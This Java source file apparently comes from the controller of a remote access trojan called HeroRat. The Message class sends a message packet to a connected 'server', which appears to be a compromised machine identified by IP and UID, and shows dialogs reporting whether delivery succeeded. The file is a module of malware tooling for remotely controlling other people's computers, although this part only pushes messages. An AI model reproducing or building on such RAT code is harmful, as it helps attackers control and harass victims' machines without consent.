package net.herorat.features.message;

import javax.swing.JOptionPane;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet8Message;


public class Message
{
	public static void send(Server server, int type, int choice, String title, String content)
	{
		Packet p = new Packet8Message(server.outputstream, new String[] { String.valueOf(type), String.valueOf(choice), title, content });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (args.length == 1 && args[0].equals("SUCCESS"))
		{
			String message_content = "The message has been successfully sent to\n" + server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")";
			JOptionPane.showOptionDialog(null, message_content, "Success", JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE, null, (Object[]) null, (Object) null);
		}
		else if (args.length == 1 && args[0].equals("ERROR"))
		{
			String message_content = "The delivery has failed\n" + server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")";
			JOptionPane.showOptionDialog(null, message_content, "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE, null, (Object[]) null, (Object) null);
		}
	}
}